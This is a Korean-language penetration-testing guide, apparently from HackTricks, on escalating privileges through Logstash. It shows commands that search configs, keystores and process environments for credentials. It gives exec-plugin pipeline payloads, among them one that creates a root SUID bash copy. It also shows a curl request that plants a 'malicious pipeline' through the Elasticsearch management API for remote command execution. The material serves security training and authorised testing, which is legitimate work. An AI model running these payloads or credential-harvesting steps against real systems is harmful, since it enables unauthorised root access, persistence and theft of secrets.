# Logstash Privilege Escalation

{{#include ../../banners/hacktricks-training.md}}

## Logstash

Logstash는 **pipelines**로 알려진 시스템을 통해 **로그를 수집하고, 변환하고, 전달**하는 데 사용됩니다. 이러한 pipelines는 **input**, **filter**, **output** 단계로 구성됩니다.<sup>[[4]](#references)</sup> Logstash가 침해된 시스템에서 실행될 때 흥미로운 상황이 발생합니다.

### Pipeline Configuration

Debian 및 RPM package 설치에서는 **/etc/logstash/pipelines.yml**을 통해 pipelines가 구성되며, 이 파일에는 pipeline configurations의 위치가 나열됩니다. 다른 배포판에서는 `pipelines.yml`을 Logstash의 `path.settings` directory에 배치합니다.<sup>[[5]](#references)[[6]](#references)</sup>
```yaml
# Define your pipelines here. Multiple pipelines can be defined.
# For details on multiple pipelines, refer to the documentation:
# https://www.elastic.co/guide/en/logstash/current/multiple-pipelines.html

- pipeline.id: main
path.config: "/etc/logstash/conf.d/*.conf"
- pipeline.id: example
path.config: "/usr/share/logstash/pipeline/1*.conf"
pipeline.workers: 6
```
이 파일은 pipeline 설정이 포함된 **.conf** 파일의 위치를 보여 줍니다. **Elasticsearch output**을 사용하는 경우 해당 output의 `user`/`password`, `cloud_auth` 또는 `api_key` 설정을 확인하십시오. 계정의 실제 권한은 Elasticsearch에 따라 달라집니다. `path.config` glob은 해당 pipeline에 대해 일치하는 모든 파일을 로드합니다.<sup>[[6]](#references)[[7]](#references)[[11]](#references)</sup>

Logstash가 `pipelines.yml` 대신 `-f <directory>`로 시작되면 `-f`가 우선 적용되며, 해당 디렉터리 내의 **모든 파일이 사전식 순서로 연결된 후 단일 config로 파싱**됩니다.<sup>[[6]](#references)[[7]](#references)</sup> 이로 인해 공격 관점에서 다음과 같은 2가지 의미가 생깁니다.

- `000-input.conf` 또는 `zzz-output.conf`와 같은 파일을 추가하면 최종 pipeline이 구성되는 방식을 변경할 수 있습니다.
- 잘못된 형식의 파일이 있으면 결합된 config의 validation이 실패할 수 있습니다. reload 중에는 Logstash가 이전 pipeline을 유지하므로 auto-reload에 의존하기 전에 payload를 validate하십시오.<sup>[[1]](#references)</sup>

### 침해된 Host에서 빠르게 Enumeration 수행

Logstash가 설치된 시스템에서 다음을 빠르게 확인합니다:
```bash
ps aux | grep -i logstash
systemctl cat logstash 2>/dev/null
cat /etc/logstash/pipelines.yml 2>/dev/null
cat /etc/logstash/logstash.yml 2>/dev/null
find /etc/logstash /usr/share/logstash -maxdepth 3 -type f \( -name '*.conf' -o -name 'logstash.yml' -o -name 'pipelines.yml' \) -ls
rg -n --hidden -S 'password|passwd|api[_-]?key|cloud_auth|ssl_keystore_password|truststore_password|user\s*=>|hosts\s*=>' /etc/logstash /usr/share/logstash 2>/dev/null
```
또한 local monitoring API에 접근 가능한지 확인합니다. 기본적으로 **127.0.0.1:9600**에 bind되며, 일반적으로 호스트에 landing한 후에는 이것으로 충분합니다.<sup>[[8]](#references)</sup>
```bash
curl -s http://127.0.0.1:9600/?pretty
curl -s http://127.0.0.1:9600/_node/pipelines?pretty
curl -s http://127.0.0.1:9600/_node/stats/pipelines?pretty
```
이러한 엔드포인트는 pipeline ID와 설정, runtime metrics, config-reload 성공/실패 카운터를 노출하므로 변경 사항이 적용되었는지 확인하는 데 도움이 됩니다.<sup>[[8]](#references)[[17]](#references)[[18]](#references)</sup>

복구한 credential이 **Elasticsearch**를 대상으로 한다면 [Elasticsearch에 관한 이 다른 페이지](../../network-services-pentesting/9200-pentesting-elasticsearch.md)를 확인하세요.

### Writable Pipelines를 통한 Privilege Escalation

Privilege Escalation을 시도하려면 먼저 Logstash service가 실제로 어떤 user로 실행 중인지 식별하세요. root 또는 **logstash** user라고 가정하지 마세요. 다음 기준 중 **하나**를 충족하는지 확인하세요.

- pipeline **.conf** file에 대한 **write access**를 보유하거나 **또는**
- **/etc/logstash/pipelines.yml** file이 wildcard를 사용하며, target folder에 write할 수 있어야 합니다.<sup>[[6]](#references)[[7]](#references)</sup>

또한 다음 조건 중 **하나**를 충족해야 합니다.

- Logstash service를 restart할 수 있거나 **또는**
- **/etc/logstash/logstash.yml** file에 **config.reload.automatic: true**가 설정되어 있어야 합니다.<sup>[[1]](#references)[[15]](#references)</sup>

설정에 wildcard가 있는 경우, 이 wildcard와 일치하는 file을 생성하면 command execution이 가능합니다.<sup>[[7]](#references)[[9]](#references)</sup> 예를 들면:
```bash
input {
exec {
command => "whoami"
interval => 120
}
}

output {
file {
path => "/tmp/output.log"
codec => rubydebug
}
}
```
여기서 **interval**은 초 단위 실행 빈도를 결정합니다. 위 예시에서는 **whoami** 명령이 120초마다 실행되며, 출력은 **/tmp/output.log**로 전달됩니다.<sup>[[9]](#references)</sup>

**/etc/logstash/logstash.yml**에서 **config.reload.automatic: true**로 설정하면 Logstash는 재시작하지 않아도 새로 추가되거나 수정된 pipeline 구성을 자동으로 감지하고 적용합니다.<sup>[[1]](#references)[[15]](#references)</sup> wildcard가 없더라도 기존 구성은 수정할 수 있지만, 서비스 중단을 방지하기 위해 주의해야 합니다.

### 더욱 안정적인 Pipeline Payload

`exec` input plugin은 현재 릴리스에서도 계속 작동하며, **interval** 또는 **schedule** 중 하나가 필요합니다. 이 plugin은 Logstash JVM을 **forking**하여 실행하므로 메모리가 부족하면 조용히 실행되지 않고 `ENOMEM` 오류와 함께 payload가 실패할 수 있습니다.<sup>[[9]](#references)</sup>

서비스에 root 소유의 SUID 파일을 생성할 수 있는 충분한 권한이 있다면, 실용적인 privilege-escalation payload는 지속적으로 남는 artifact를 생성하는 방식입니다:
```bash
input {
exec {
command => "cp /bin/bash /tmp/logroot && chown root:root /tmp/logroot && chmod 4755 /tmp/logroot"
interval => 300
}
}
output {
null {}
}
```
재시작 권한은 없지만 프로세스에 signal을 보낼 수 있다면, Logstash는 Unix 계열 시스템에서 **SIGHUP**으로 트리거되는 reload도 지원합니다:<sup>[[1]](#references)</sup>
```bash
kill -SIGHUP $(pgrep -f logstash)
```
모든 plugin이 reload-friendly한 것은 아닙니다. 예를 들어 **stdin** input은 automatic reload를 방지하므로, `config.reload.automatic`이 항상 변경 사항을 반영한다고 가정하지 마세요.<sup>[[1]](#references)</sup>

### Logstash에서 Secrets 탈취하기

code execution에만 집중하기 전에, Logstash가 이미 액세스할 수 있는 데이터를 먼저 수집하세요:

- Credentials는 `elasticsearch {}` outputs, `http_poller` URLs/settings, JDBC inputs 또는 cloud 관련 settings에 나타날 수 있습니다. 이러한 plugins에는 검색할 가치가 있는 credential fields가 노출되어 있습니다.<sup>[[11]](#references)[[12]](#references)[[13]](#references)</sup>
- Secure settings는 **`/etc/logstash/logstash.keystore`** 또는 다른 `path.settings` directory에 있을 수 있습니다.<sup>[[5]](#references)[[10]](#references)</sup>
- Keystore password는 **`LOGSTASH_KEYSTORE_PASS`**를 통해 제공될 수 있으며, RPM/DEB installs는 **`/etc/sysconfig/logstash`**에서 service environment variables를 source합니다.<sup>[[10]](#references)</sup>
- `${VAR}`를 사용하는 Environment-variable expansion은 Logstash startup 시 resolve되므로, service environment를 확인할 가치가 있습니다.<sup>[[14]](#references)</sup>

유용한 확인 사항:
```bash
ls -l /etc/logstash /etc/logstash/logstash.keystore 2>/dev/null
strings /etc/logstash/conf.d/*.conf 2>/dev/null | head
tr '\0' '\n' < /proc/$(pgrep -o -f logstash)/environ 2>/dev/null | sort
cat /etc/sysconfig/logstash 2>/dev/null
journalctl -u logstash --no-pager 2>/dev/null | tail -n 200
ls -lah /var/log/logstash 2>/dev/null
```
이는 **CVE-2023-46672**에서 특정 상황에서 Logstash가 keystore에 저장되고 configuration에서 참조된 secrets를 포함한 민감한 정보를 로그에 기록한 것으로 나타났기 때문에 확인할 가치가 있습니다. 이러한 상황이 적용될 가능성이 있다면 이전 Logstash 로그와 `journald` 항목을 검토하세요.<sup>[[3]](#references)</sup>

### Centralized Pipeline Management Abuse

일부 환경에서는 host가 로컬 `.conf` 파일에 전혀 의존하지 않습니다. **`xpack.management.enabled: true`**가 설정되어 있으면 Logstash는 Elasticsearch/Kibana에서 중앙 관리되는 pipelines를 가져올 수 있으며, 이 mode를 활성화한 후에는 로컬 pipeline configs가 더 이상 source of truth가 아닙니다.<sup>[[2]](#references)</sup>

이는 다른 attack path가 존재한다는 의미입니다.

1. 로컬 Logstash settings, keystore 또는 logs에서 Elastic credentials를 복구합니다.<sup>[[3]](#references)[[10]](#references)</sup>
2. 해당 account에 **`manage_logstash_pipelines`** cluster privilege가 있는지 확인합니다.<sup>[[16]](#references)</sup>
3. 중앙 관리되는 pipeline을 생성하거나 교체하여, 다음 poll interval에 Logstash host가 사용자의 payload를 실행하도록 합니다.<sup>[[2]](#references)[[16]](#references)</sup>

이 기능에 사용되는 Elasticsearch API는 다음과 같습니다.<sup>[[16]](#references)</sup>
```bash
curl -X PUT http://ELASTIC:9200/_logstash/pipeline/pwned \
-H 'Content-Type: application/json' \
-u user:password \
-d '{
"description": "malicious pipeline",
"last_modified": "2026-01-02T02:50:51.250Z",
"username": "user",
"pipeline": "input { exec { command => \"id > /tmp/.ls-rce\" interval => 120 } } output { null {} }",
"pipeline_metadata": {"type": "logstash_pipeline", "version": "1"},
"pipeline_settings": {
"pipeline.workers": 1,
"pipeline.batch.size": 1,
"pipeline.batch.delay": 50,
"queue.type": "memory",
"queue.max_bytes": "1gb",
"queue.checkpoint.writes": 1024
}
}'
```
이는 로컬 파일이 읽기 전용이지만 Logstash가 이미 원격으로 pipeline을 가져오도록 등록된 경우 특히 유용합니다.<sup>[[2]](#references)[[16]](#references)</sup>

## References

- [1] [Elastic 문서: Config File 다시 로드](https://www.elastic.co/guide/en/logstash/8.19/reloading-config.html)
- [2] [Elastic 문서: 중앙 집중식 Pipeline Management 구성](https://www.elastic.co/guide/en/logstash/8.19/configuring-centralized-pipelines.html)
- [3] [Logstash 8.11.1 Security Update (ESA-2023-26) - CVE-2023-46672](https://discuss.elastic.co/t/logstash-8-11-1-security-update-esa-2023-26/347191)
- [4] [Elastic 문서: Logstash Pipeline 생성](https://www.elastic.co/docs/reference/logstash/creating-logstash-pipeline)
- [5] [Elastic 문서: Logstash Directory Layout](https://www.elastic.co/docs/reference/logstash/dir-layout)
- [6] [Elastic 문서: Multiple Pipelines](https://www.elastic.co/docs/reference/logstash/multiple-pipelines)
- [7] [Elastic 문서: Command Line에서 Logstash 실행](https://www.elastic.co/docs/reference/logstash/running-logstash-command-line)
- [8] [Elastic 문서: API를 사용한 Logstash Monitoring](https://www.elastic.co/docs/reference/logstash/monitoring-logstash)
- [9] [Elastic 문서: Exec input plugin](https://www.elastic.co/docs/reference/logstash/plugins/plugins-inputs-exec)
- [10] [Elastic 문서: 보안 설정을 위한 Secrets keystore](https://www.elastic.co/docs/reference/logstash/keystore)
- [11] [Elastic 문서: Elasticsearch output plugin](https://www.elastic.co/docs/reference/logstash/plugins/plugins-outputs-elasticsearch)
- [12] [Elastic 문서: Http_poller input plugin](https://www.elastic.co/docs/reference/logstash/plugins/plugins-inputs-http_poller)
- [13] [Elastic 문서: Jdbc input plugin](https://www.elastic.co/docs/reference/logstash/plugins/plugins-inputs-jdbc)
- [14] [Elastic 문서: 환경 변수 사용](https://www.elastic.co/docs/reference/logstash/environment-variables)
- [15] [Elastic 문서: logstash.yml](https://www.elastic.co/docs/reference/logstash/logstash-settings-file)
- [16] [Elasticsearch API: Logstash pipeline 생성 또는 업데이트](https://www.elastic.co/docs/api/doc/elasticsearch/operation/operation-logstash-put-pipeline)
- [17] [Logstash API: Pipeline 설정 가져오기](https://www.elastic.co/docs/api/doc/logstash/operation/operation-nodeinfopipelines)
- [18] [Logstash API: Pipeline 통계 가져오기](https://www.elastic.co/docs/api/doc/logstash/operation/operation-nodestatspipelines)
{{#include ../../banners/hacktricks-training.md}}
